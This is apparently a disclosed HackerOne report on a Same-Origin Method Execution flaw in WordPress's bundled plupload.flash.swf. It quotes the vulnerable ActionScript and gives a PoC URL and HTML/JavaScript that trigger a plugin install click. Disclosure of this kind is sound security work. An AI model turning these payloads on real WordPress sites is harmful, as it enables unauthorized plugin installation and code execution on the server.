@@ -1,0 +1,200 @@
+ReportLink:https://hackerone.com/reports/134738
+WeaknessName:Code Injection
+Reporter:https://hackerone.com/cure53
+ReportedTo:Automattic(automattic)
+BountyAmount:1337.0
+Severity:
+State:Closed
+DateOfDisclosure:10.07.2016 12:50:19
+
+Summary:
+
+Intro
+==
+
+WordPress is vulnerable against a Same-Origin Method Execution (SOME) vulnerability that stems from an insecure URL sanitization problem performed in the file *plupload.flash.swf*. The code in the file attempts to remove *flashVars* [¹](https://helpx.adobe.com/flash/kb/pass-variables-swfs-flashvars.html) in case they have been set GET parameters but fails to do so, enabling XSS via *ExternalInterface* [²](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/external/ExternalInterface.html).
+
+The attack technique was first described by Soroush Dalili in 2013 [³](https://soroush.secproject.com/blog/2013/10/catch-up-on-flash-xss-exploitation-bypassing-the-guardians-part-1/). The vulnerability in *plupload.flash.swf* was discovered in April 2016, first identified as SOME[⁴](http://www.benhayak.com/2015/06/same-origin-method-execution-some.html) bug by Kinugawa. Then, after a team review, the XSS potential was discovered and analyzed by Heiderich, Kinugawa and Inführ. Finally, it was discovered, that this file comes packaged with latest WordPress and the issue was reported here by Heiderich et al.
+
+**Simple PoC:**
+http://example.com//wp-includes/js/plupload/plupload.flash.swf?%#target%g=alert&uid%g=hello&
+
+A more complex PoC was created to demonstrate the potential Remote Code Execution attack (RCE) of this vulnerability. A detailed description thereof can be found below.
+
+```html
+<button onclick="fire()">Click</button>
+<script>
+function fire() {
+ open('javascript:setTimeout("location=\'http://example.com/wp-includes/js/plupload/plupload.flash.swf?%#target%g=opener.document.body.firstElementChild.nextElementSibling.nextElementSibling.nextElementSibling.firstElementChild.click&uid%g=hello&\'", 2000)');
+  setTimeout('location="http://example.com/wp-admin/plugin-install.php?tab=plugin-information&plugin=wp-super-cache&TB_iframe=true&width=600&height=550"')
+}
+</script>
+```
+
+Background
+==
+
+The majority of background information as to why this kind of attack works and how the protective mechanisms installed in the SWF can be bypassed was already explained in depth in this bug report:
+
+https://hackerone.com/bugs?subject=user&report_id=134546
+
+This section will therefore describe the SOME bug in more detail and omit the basics on why the attack works as they are identical to the ones in the other ticket. Now, let's get specific with this bug's details.
+
+Similar to the affected file in the linked report, Plupload employs the so called “GET Killer”:
+
+```actionscript
+params = root.loaderInfo.parameters;
+pos = root.loaderInfo.url.indexOf('?');
+if (pos !== -1) {
+    query = Utils.parseStr(root.loaderInfo.url.substr(pos + 1));        
+    
+    for (var key:String in params) {    
+        if (query.hasOwnProperty(Utils.trim(key))) {
+            delete params[key];
+        }
+    }
+}
+```
+
+From: https://github.com/moxiecode/moxie/blob/d91c63758c1d372a38615e8b966b50545faa70ca/src/flash/src/Moxie.as#L70
+
+The string parsing is done in a different ActionScript file:
+
+```actionscript
+static public function parseStr (str:String) : Object {
+    var hash:Object = {},
+        arr1:Array, arr2:Array;
+    
+    str = unescape(str).replace(/\+/g, " ");
+    
+    arr1 = str.split('&');
+    if (!arr1.length) {
+        return {};
+    }
+    
+    for (var i:uint = 0, length:uint = arr1.length; i < length; i++) {
+        arr2 = arr1[i].split('=');
+        if (!arr2.length) {
+            continue;
+        }
+        hash[Utils.trim(arr2[0])] = Utils.trim(arr2[1]);
+    }
+    return hash;
+}
+```
+
+From: https://github.com/moxiecode/moxie/blob/d91c63758c1d372a38615e8b966b50545faa70ca/src/flash/src/mxi/Utils.as#L102
+
+The sanitization in this file is done quite well and strict enough to prohibit XSS attacks. An attacker can however select a different type of attack, also known as SOME or Reverse Clickjacking.
+
+The affected code can be found here:
+
+```actionscript
+private function _fireEvent(evt:*, obj:* = null):void {
+    try {
+        ExternalInterface.call(eventDispatcher, evt, obj);
+    } catch(err:*) {
+        //_fireEvent("Exception", { name: 'RuntimeError', message: 4 });
+        
+        // throwing an exception would be better here
+    }
+}
+```
+
+The method is being called from within the `_init()` method and receives an event and an optional object. The actual event dispatcher is stored as an object member at a different place in the code.
+
+**Calling _fireEvent:**
+```actionscript
+Moxie.uid = Utils.sanitize(params["uid"]);    
+
+[...]
+
+_fireEvent(Moxie.uid + "::Init");    
+```
+
+
+**Setting the event dispatcher:**
+```actionscript
+// Event dispatcher
+if (params.hasOwnProperty("target") && /^[\w\.]+$/.test(params["target"])) {
+    eventDispatcher = params["target"];
+}
+```
+
+The sanitation for both the event dispatcher and the event string is quite tough and only allows word characters in one case, and word characters and the dot in the other case:
+
+```actionscript
+if (params.hasOwnProperty("target") && /^[\w\.]+$/.test(params["target"])) {
+
+```
+
+```actionscript
+static public function sanitize(str:String) : String
+{
+    // allow only [a-zA-Z0-9_]
+    return str.replace(/[^\w]/g, '');
+}
+[...]
+Moxie.uid = Utils.sanitize(params["uid"]);
+
+```
+
+Despite the strong validation, the attacker can still cause damage - tremendous damage too. This is done by executing a SOME attack. This kind of attack allows to generate certain types of events by abusing the callback.
+
+An attacker can for example click a button on the same domain as the Flash file by instructing the Flash file, not to execute a pre-defined callback but rather by making use of certain DOM properties that give more or less direct access to the button and then by executing a `click()` method. Let’s have a look at a trivial example first and imagine *victim.com* that hosts both the Plupload SWF and some logic, where a click on a button will, let’s say, delete a user:
+
+* Attacker crafts a specific payload
+* Attacker then lures logged in victim to a website 
+* The website will do the following steps 
+* Open the Plupload SWF in a new tab
+* Have the SWF use the target parameter `opener.document.body.firstElementChild.firstElementChild.click`
+* While the SWF still loads, the `opener` location changes
+* It navigates to *victim.com/admin*
+* Now, SWF and page are on the same domain
+* SWF is now allows to perform clicks on opener. The button will be clicked
+
+Done, that is the whole attack in simple. Open SWF in a new window, define a callback that traverses to an important element and clicks it, navigate the opener to the page containing the element, have the click happen.
+
+Now, the following more specific PoC describes the attack against WordPress and shows, how we can turn the SOME into an RCE!
+
+1. An attacker sends a link that contains the exploit to an authenticated user
+2. The user (victim) opens the link and clicks the button
+3. The exploit opens a new window to the SWF file, meanwhile the other window is loading the plugin page
+5. The exploit then triggers the install button of a malicious plugin
+6. The plugin is installed and the malicious codes are uploaded on the server accordingly
+
+```html
+<button onclick="fire()">Click</button>
+<script>
+function fire() {
+ open('javascript:setTimeout("location=\'http://example.com/wp-includes/js/plupload/plupload.flash.swf?%#target%g=opener.document.body.firstElementChild.nextElementSibling.nextElementSibling.nextElementSibling.firstElementChild.click&uid%g=hello&\'", 2000)');
+  setTimeout('location="http://example.com/wp-admin/plugin-install.php?tab=plugin-information&plugin=wp-super-cache&TB_iframe=true&width=600&height=550"')
+}
+</script>
+```
+
+Affected Systems
+==
+
+All WordPress instances that allow to directly call this file. That should be the absolute majority. Google finds a couple of them but we assume it is actually significantly more[⁹](https://www.google.com/search?q=inurl:/wp-includes/js/plupload/plupload.flash.swf+ext:swf&channel=fs&start=10).
+
+Here is some numbers that other people guesstimate:
+ * https://managewp.com/14-surprising-statistics-about-wordpress-usage
+ * https://www.quora.com/How-many-websites-are-built-on-Wordpress
+ * https://wordpress.com/activity/
+
+Further note, browser-based XSS filters will not detect the attack and hence not protect here.
+
+Mitigation
+==
+
+* Prevent direct access to all Flash files in the WordPress folder (`Content-Disposition` headers might help)
+* Configure your WAF to block direct access to this file
+* Wait for the fix and update Wordpress
+
+Credits
+==
+
+Credits for this find go to Soroush Dalili for initially documenting the attack technique that helped bypassing “The GET Killer”.
+
+Further credits go to Kinugawa, Filedescriptor and Heiderich of Cure53 for discovering the bug in WordPress default installations and developing an attack scenario leading to RCE by using SOME to install rogue WordPress Plugins.
